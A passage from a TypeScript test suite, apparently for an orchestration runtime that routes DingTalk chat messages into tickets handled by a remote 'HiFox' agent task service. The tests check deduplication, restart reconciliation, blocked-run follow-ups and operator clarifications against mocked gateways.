    const accepted = await route({ kind: 'accept', trigger_id: id, hifox_agent_id: 'configured-agent', hifox_agent_reason: '日志排查', title: '测试请求', acknowledgement: '收到，核对测试日志。' })
    const ticketId = (accepted.ticket as { ticket_id: string }).ticket_id
    expect(remote.orders).toHaveLength(1)

    await python('restarted')
    await runtime.idle()
    const followup = key('dingtalk', 'pilot-chat', 'socket-followup')
    expect(runtime.store.triggers.disposition(followup)).toMatchObject({ fanout: [ticketId] })
    expect(runtime.store.tickets.list()).toHaveLength(1)
    expect(remote.orders).toHaveLength(1)
    const inbox = new DatabaseSync(join(directory, 'messages.sqlite3'), { readOnly: true })
    try {
      expect(inbox.prepare('SELECT state, route, payload FROM intake ORDER BY rowid').all()).toEqual([
        { state: 'pilot_delivered', route: 'pilot', payload: null }, { state: 'pilot_delivered', route: 'pilot', payload: null },
      ])
    } finally { inbox.close() }
    await runtime.stop()
    expect(existsSync(endpoint)).toBe(false)
  })

  it('preserves a filtered decision when the bridge repeats a message after receiving no reply', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const settings = runtime.store.settings()
    runtime.store.saveSettings({ ...settings, sources: { ...settings.sources, dingtalk: { enabled: false, config: {} } } })
    const event = dingTalkMessage('filtered')
    expect(runtime.receiveDingTalk(event)).toBe('filtered')
    runtime.store.saveSettings(settings)
    expect(runtime.receiveDingTalk(event)).toBe('filtered')
    expect(remote.orders).toHaveLength(0)
  })

  it('deduplicates, keeps verified same-thread replies on the original card, and rejects a stale Run result', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    expect(runtime.receiveDingTalk(dingTalkMessage('original'))).toBe('duplicate')
    expect(runtime.receiveDingTalk(dingTalkMessage('foreign', { conversationId: 'other-room' }))).toEqual({ manual: 'outside_pilot' })
    expect(runtime.receiveDingTalk(dingTalkMessage('unrelated', { replyToMessageId: 'untracked' }))).toBe('stored')
    const unrelatedId = key('dingtalk', 'pilot-chat', 'unrelated')
    const original = runtime.store.triggers.get(key('dingtalk', 'pilot-chat', 'original'))!
    const unrelated = runtime.store.triggers.get(unrelatedId)!
    expect(unrelated.threads).not.toEqual(original.threads)
    expect(unrelated.meta).toMatchObject({ quotedMessageId: 'untracked', threadRootId: 'unrelated' })
    expect(unrelated.meta).not.toHaveProperty('replyToMessageId')
    await expect(route({ kind: 'attach', trigger_id: unrelatedId, ticket_id: ticketId })).rejects.toThrow('verified message thread')
    expect(runtime.receiveDingTalk(dingTalkMessage('clue', {
      senderId: 'pilot-bob', replyToMessageId: 'original', addressed: undefined, text: '补充线索',
    }))).toBe('stored')
    await runtime.idle()
    expect(runtime.store.tickets.list()).toHaveLength(1)
    expect(remote.tasks).toHaveLength(1)
    expect(remote.orders).toHaveLength(1)
    expect(remote.comments).toEqual([expect.objectContaining({ taskUuid: remote.tasks[0]!.taskUuid, text: expect.stringContaining('补充线索') })])
    expect(runtime.store.triggers.disposition(key('dingtalk', 'pilot-chat', 'clue'))?.evalId).toBeUndefined()
    expect(agents.has(`worker-${ticketId}`)).toBe(false)

    remote.finish(0)
    await advancePilot()
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'blocked', summary: expect.stringContaining('输入版本') })

    runtime.engine.retryTicket(ticketId)
    await runtime.idle()
    expect(remote.tasks).toHaveLength(1)
    expect(remote.orders).toHaveLength(2)
    expect(remote.orders[1]!.inputRevision).not.toBe(remote.orders[0]!.inputRevision)
    expect(remote.orders[1]!.taskUuid).toBe(remote.orders[0]!.taskUuid)
    remote.finish(1)
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.ended?.outcome).toBe('completed')
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'ready', summary: expect.stringContaining('已定位具体缺项') })
    const resultReplies = () => remote.sendDingTalk.mock.calls.filter(([reply]) => reply.kind === 'reply' && reply.text.includes('evidence-01'))
    expect(resultReplies()).toHaveLength(1)
    const duplicate = { purpose: 'result', text: '再次发送结果 evidence-01' }
    await expect(runTool(runtime.masterId, 'orchestrator_reply', { ...duplicate, ticket_id: ticketId })).rejects.toThrow('HiFox executor')
    await expect(runTool(runtime.masterId, 'orchestrator_reply', { ...duplicate, trigger_id: key('dingtalk', 'pilot-chat', 'original') }))
      .rejects.toThrow('HiFox executor')
    expect(resultReplies()).toHaveLength(1)
    expect(remote.comments.some(comment => comment.text.includes('已定位具体缺项'))).toBe(true)
    expect(remote.orders[1]?.initialClues.map(clue => clue.text)).toEqual(['请查资料不完整的原因。', '补充线索'])

    expect(() => runtime.receive(feishu('11', '@bot 修一下回归'))).toThrow('Feishu source has been removed')
    expect(controller.create.mock.calls.map(([request]) => request.sessionId)).toEqual([runtime.masterId])

  })

  it('reopens the persisted HiFox card and polls the same in-flight Run without dispatching again', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    const original = remote.runs[0]!
    const assignment = runtime.store.tickets.get(ticketId)?.assignments[0]
    expect(assignment?.state).toBe('running')
    expect(runtime.executor.activeCount()).toBe(1)
    remote.gateway.run.mockClear()

    await restart({}, {}, remote.pilot)
    await runtime.ready
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.assignments[0]).toMatchObject({ id: assignment!.id, state: 'running' })
    expect(runtime.hiFox?.status(ticketId)?.taskUuid).toBe(original.taskUuid)
    expect(remote.gateway.run).toHaveBeenCalledWith(expect.objectContaining({
      taskUuid: original.taskUuid, conversationId: original.conversationId, runId: original.runId,
    }), expect.any(AbortSignal))

    remote.finish(0)
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.ended?.outcome).toBe('completed')
    expect(remote.gateway.createTask).toHaveBeenCalledTimes(1)
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(runtime.executor.activeCount()).toBe(0)
  })

  it('reconciles lost card, summon, and writeback receipts without resending across restart', async () => {
    const remote = fakeHiFox()
    const create = remote.gateway.createTask.getMockImplementation()!
    const summon = remote.gateway.summon.getMockImplementation()!
    const comment = remote.gateway.comment.getMockImplementation()!
    remote.gateway.createTask.mockImplementationOnce(async (...args) => { await create(...args); throw new Error('lost create reply') })
    remote.gateway.summon.mockImplementationOnce(async (...args) => { await summon(...args); throw new Error('lost summon reply') })
    remote.gateway.comment.mockImplementationOnce(async (...args) => { await comment(...args); throw new Error('lost comment reply') })
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    expect(remote.tasks).toHaveLength(1)
    expect(remote.orders).toHaveLength(0)
    await advancePilot()
    expect(remote.orders).toHaveLength(1)
    const assignmentId = runtime.store.tickets.get(ticketId)?.assignments[0]!.id
    await restart({}, {}, remote.pilot)
    await runtime.ready
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.assignments[0]).toMatchObject({ id: assignmentId, state: 'running' })
    remote.finish(0)
    await advancePilot()
    expect(remote.comments).toHaveLength(1)
    expect(runtime.store.tickets.get(ticketId)?.ended).toBeUndefined()
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.ended?.outcome).toBe('completed')
    expect(remote.gateway.createTask).toHaveBeenCalledTimes(1)
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(remote.gateway.comment).toHaveBeenCalledTimes(1)
  })

  it('keeps a lost summon reserved when queries return no match, including after manual ticket retry', async () => {
    const remote = fakeHiFox()
    remote.pilot.reconcileMs = 1
    remote.gateway.summon.mockRejectedValueOnce(new Error('transport lost after write'))
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    await new Promise(resolve => setTimeout(resolve, 5))
    await advancePilot()
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'blocked', summary: expect.stringContaining('人工核对') })
    const retry = runtime.engine.retryTicket(ticketId)
    await runtime.idle()
    expect(retry.assignments).toHaveLength(2)
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(lastPilotReport(ticketId)?.state).toBe('blocked')
  })

  it('keeps an out-of-run or malformed report local without emitting a terminal reply', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    remote.finish(0, { launchKey: 'foreign' })
    await advancePilot()
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'blocked', summary: expect.stringContaining('派工记录不一致') })
    expect(remote.sendDingTalk.mock.calls.some(([reply]) => reply.hiFoxTerminal)).toBe(false)
  })

  it('delivers a verified agent blocker once and quotes the exact DingTalk origin', async () => {
    const remote = fakeHiFox()
    await startPilot({ ...remote.pilot, requireTerminalOrigin: true })
    const ticketId = await acceptPilot()
    remote.finish(0, { outcome: 'blocked', summary: '缺少附件截图。' })
    await advancePilot()
    await runtime.sendReplies()
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'blocked', summary: '缺少附件截图。' })
    expect(remote.sendDingTalk).toHaveBeenCalledTimes(1)
    expect(remote.sendDingTalk).toHaveBeenCalledWith(expect.objectContaining({
      hiFoxTerminal: true, id: key('hifox-terminal', ticketId),
      channel: expect.objectContaining({ address: { conversationId: 'pilot-chat', messageId: 'original' } }),
    }))
  })

  it('clears a HiFox Task polling alert on a healthy check and keeps watching the blocked ticket', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    remote.finish(0, { outcome: 'blocked', summary: '等待补充。' })
    await advancePilot()

    remote.gateway.taskRun.mockRejectedValue(new DOMException('The operation was aborted', 'AbortError'))
    for (let attempt = 0; attempt < 3; attempt++) await advancePilot()
    expect(runtime.health.hifox).toMatchObject({ state: 'error', detail: expect.stringContaining('AbortError') })

    remote.gateway.taskRun.mockResolvedValue(undefined)
    await advancePilot()
    expect(runtime.health.hifox).toMatchObject({ state: 'ready', detail: expect.stringContaining('1 waiting') })
    expect(runtime.effects.pending('hifox', ticketId)).toBe(true)
    expect(lastPilotReport(ticketId)?.state).toBe('blocked')

    remote.gateway.taskRun.mockRejectedValue(new DOMException('The operation was aborted', 'AbortError'))
    await advancePilot()
    expect(runtime.health.hifox).toMatchObject({ state: 'ready' })
    await advancePilot()
    await advancePilot()
    expect(runtime.health.hifox).toMatchObject({ state: 'error' })
  })

  it('follows the same HiFox Task after a blocked Run and accepts a verified continuation after restart', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    remote.finish(0, { outcome: 'blocked', summary: '需要在原会话补充信息。' })
    await advancePilot()
    expect(lastPilotReport(ticketId)?.state).toBe('blocked')
    expect(remote.statuses.get('task-1')?.name).toBe('进行中')
    expect(runtime.effects.pending('hifox', ticketId)).toBe(true)

    const original = remote.runs[0]!
    const next = { ...original, runId: 'continued-in-hifox', status: 'completed' as const,
      report: { ...(original.report as object), outcome: 'completed', summary: '已使用补充信息完成。' } }
    remote.gateway.taskRun.mockResolvedValue({ ...next, conversationId: 'different-conversation' })
    await restart({}, {}, remote.pilot)
    await runtime.ready
    await advancePilot()
    expect(lastPilotReport(ticketId)?.state).toBe('blocked')

    remote.gateway.taskRun.mockResolvedValue(next)
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.ended?.outcome).toBe('completed')
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'ready', summary: '已使用补充信息完成。' })
    expect(remote.statuses.get('task-1')?.name).toBe('已完成')
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(remote.comments.filter(row => row.text.includes('已使用补充信息完成。'))).toHaveLength(1)
    expect(runtime.effects.pending('hifox', ticketId)).toBe(false)
  })

  it('writes a new note on the original HiFox card and continues once after its blocked Run', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    remote.finish(0, { outcome: 'blocked', summary: '缺少目标仓库。' })
    await advancePilot()

    const note = '目标仓库为 gateway，仓库修改授权待确认。'
    const original = remote.runs[0]!
    remote.runs.push({ ...original, runId: 'active-followup', status: 'running' })
    runtime.engine.note(ticketId, note)
    await advancePilot()
    expect(remote.comments.filter(row => row.text.includes(note)).map(row => row.taskUuid)).toEqual(['task-1'])
    expect(runtime.store.tickets.get(ticketId)?.undelivered).toEqual([])
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)

    remote.runs.pop()
    await startPilot(remote.pilot)
    await advancePilot()
    expect(remote.orders).toHaveLength(2)
    expect(remote.orders[1]).toMatchObject({ taskUuid: 'task-1', supplementalNotes: [note] })
    expect(remote.orders[1]?.inputRevision).not.toBe(remote.orders[0]?.inputRevision)
    expect(runtime.store.tickets.get(ticketId)?.attention).toBeUndefined()

    remote.finish(1, { outcome: 'blocked', summary: '仍缺修改授权。' })
    await advancePilot()
    await startPilot(remote.pilot)
    await advancePilot()
    expect(remote.tasks).toHaveLength(1)
    expect(remote.comments.filter(row => row.text.includes(note))).toHaveLength(1)
    expect(remote.gateway.summon).toHaveBeenCalledTimes(2)
    expect(lastPilotReport(ticketId)).toMatchObject({ state: 'blocked', summary: '仍缺修改授权。' })
  })

  it.each([false, true])('sends one DSH clarification and resumes the same card after the operator replies (lost receipt: %s)', async lost => {
    const remote = fakeHiFox()
    const group = 'clarification-group'
    const sent = { messageId: 'dsh-question', senderId: 'operator', conversationId: group, text: '' }
    const answer = { messageId: 'answer', senderId: 'operator', conversationId: group, text: '仓库是 gateway。',
      quotedMessage: { messageId: sent.messageId, conversationId: group } }
    const other = { ...answer, senderId: 'someone-else', messageId: 'other' }
    const send = vi.fn(async (_id: string, text: string) => {
      sent.text = text
      if (lost) throw new Error('Receipt lost after sending')
      return 'send-task'
    })
    const replies = vi.fn(async () => lost && sent.text ? [sent, other] : [other])
    const pilot = { ...remote.pilot, clarifications: { group, responder: sent.senderId, send, confirm: vi.fn(async () => sent), replies } }
    const poll = async () => {
      runtime.store.db.prepare("UPDATE effect SET due = 0 WHERE kind = 'dingtalk-clarifications'").run()
      await runtime.pump()
      await runtime.idle()
    }
    await startPilot(pilot)
    const ticketId = await acceptPilot()
    remote.finish(0, { outcome: 'blocked', summary: '请确认目标仓库。' })
    await advancePilot()
    await poll()
    await poll()
    expect(send).toHaveBeenCalledWith(expect.any(String), expect.stringContaining('请确认目标仓库。'))
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(runtime.store.tickets.get(ticketId)?.inputs.filter(input => input.kind === 'note')).toHaveLength(0)
    expect(remote.sendDingTalk.mock.calls.some(([reply]) => reply.text.includes('请确认目标仓库。'))).toBe(false)

    replies.mockResolvedValue([other, answer, answer])
    await startPilot(pilot)
    await poll()
    await advancePilot()
    expect(send).toHaveBeenCalledTimes(1)
    expect(remote.orders).toHaveLength(2)
    expect(remote.orders[1]).toMatchObject({ taskUuid: 'task-1', supplementalNotes: ['工单联系人在钉钉澄清群回复：仓库是 gateway。'] })
    expect(remote.comments.filter(row => row.text.includes(answer.text)).map(row => row.taskUuid)).toEqual(['task-1'])
  })

  it.each([['已完成', 'completed'], ['已取消', 'cancelled'], ['存在重复', 'duplicate']])(
    'stops Task follow-up on %s and preserves the last verified Run report across restart', async (name, category) => {
      const remote = fakeHiFox()
      await startPilot(remote.pilot)
      const ticketId = await acceptPilot()
      remote.finish(0, { outcome: 'blocked', summary: '等待补充信息。' })
      await advancePilot()
      const status = { name, category }
      remote.statuses.set('task-1', status)
      remote.gateway.taskRun.mockClear()
      await advancePilot()
      expect(runtime.hiFox?.status(ticketId)?.taskStatus).toEqual(status)
      expect(runtime.store.tickets.get(ticketId)?.ended?.reason).toContain(name)
      expect(lastPilotReport(ticketId)?.state).toBe('blocked')
      expect(runtime.effects.pending('hifox', ticketId)).toBe(false)
      await restart({}, {}, remote.pilot)
      await runtime.ready
      await advancePilot()
      expect(remote.gateway.taskRun).not.toHaveBeenCalled()
      expect(remote.gateway.setTaskStatus.mock.calls.map(([, target]) => target)).toEqual(['started'])
    },
  )

  it('retries confirmed completion after a lost status write receipt without repeating the result', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    remote.gateway.setTaskStatus.mockImplementationOnce(async () => {
      remote.statuses.set('task-1', { name: '已完成', category: 'completed' })
      throw new Error('lost status receipt')
    })
    remote.finish(0)
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.ended?.outcome).toBe('completed')
    expect(runtime.effects.pending('hifox', ticketId)).toBe(true)
    await restart({}, {}, remote.pilot)
    await runtime.ready
    await advancePilot()
    expect(runtime.hiFox?.status(ticketId)?.taskStatus?.name).toBe('已完成')
    expect(runtime.effects.pending('hifox', ticketId)).toBe(false)
    expect(remote.comments).toHaveLength(1)
  })

  it('preserves an earlier pilot ticket and observes its Run without retrying the old work order', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    const origin = runtime.store.triggers.get(key('dingtalk', 'pilot-chat', 'original'))!
    const { threadRootId: _removed, ...historical } = origin.meta
    runtime.store.triggers.save({ ...origin, meta: { ...historical, request: { requestId: 'old-001' } } })
    const { hiFoxAgent: _oldAgent, ...oldTicket } = runtime.store.tickets.get(ticketId)!
    runtime.store.tickets.save(oldTicket)
    const binding = runtime.hiFox?.status(ticketId)
    runtime.store.db.prepare("UPDATE kv SET value = ? WHERE key = ?")
      .run(JSON.stringify({ ...binding, scope: 'previous-contract' }), 'hifox-binding:' + ticketId)
    await restart({}, {}, remote.pilot)
    await runtime.ready
    await advancePilot()
    expect(lastPilotReport(ticketId)?.summary).toContain('还未核实终止')
    remote.finish(0)
    await advancePilot()
    expect(lastPilotReport(ticketId)?.summary).toContain('保留原记录')
    expect(runtime.hiFox?.status(ticketId)?.taskUuid).toBe(binding?.taskUuid)
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(remote.gateway.comment).not.toHaveBeenCalled()
  })

  it('does not report ready for an earlier input version when its result comment was already in flight', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    remote.finish(0)
    const comment = remote.gateway.comment.getMockImplementation()!
    const entered = Promise.withResolvers<void>()
    const release = Promise.withResolvers<void>()
    remote.gateway.comment.mockImplementationOnce(async (...args) => {
      const receipt = await comment(...args)
      entered.resolve()
      await release.promise
      return receipt
    })
    const verifying = advancePilot()
    await entered.promise
    expect(runtime.receiveDingTalk(dingTalkMessage('clue', { replyToMessageId: 'original' }))).toBe('stored')
    release.resolve()
    await verifying
    await advancePilot()
    expect(runtime.store.tickets.get(ticketId)?.ended).toBeUndefined()
    expect(lastPilotReport(ticketId)?.state).toBe('blocked')
    expect(remote.comments[0]!.text).toContain(remote.orders[0]!.inputRevision)
    expect(remote.sendDingTalk.mock.calls.some(([reply]) => reply.text.includes('已定位具体缺项'))).toBe(false)
  })

  it('reconciles an in-flight summon after stop without writing back or launching more work', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const summon = remote.gateway.summon.getMockImplementation()!
    const entered = Promise.withResolvers<void>()
    const release = Promise.withResolvers<void>()
    remote.gateway.summon.mockImplementationOnce(async (...args) => {
      const receipt = await summon(...args)
      entered.resolve()
      await release.promise
      return receipt
    })
    const accepted = acceptPilot()
    await entered.promise
    const { id } = runtime.store.tickets.list()[0]!
    runtime.engine.stopTicket(id)
    release.resolve()
    expect(await accepted).toBe(id)
    expect(runtime.hiFox?.status(id)?.issue).toContain('确认停止 Run')
    expect(remote.statuses.get('task-1')?.name).toBe('已取消')
    remote.finish(0)
    await advancePilot()
    expect(runtime.store.tickets.get(id)?.ended?.by).toBe('human')
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(remote.comments).toHaveLength(0)
    expect(remote.gateway.taskRun).not.toHaveBeenCalled()
  })
})
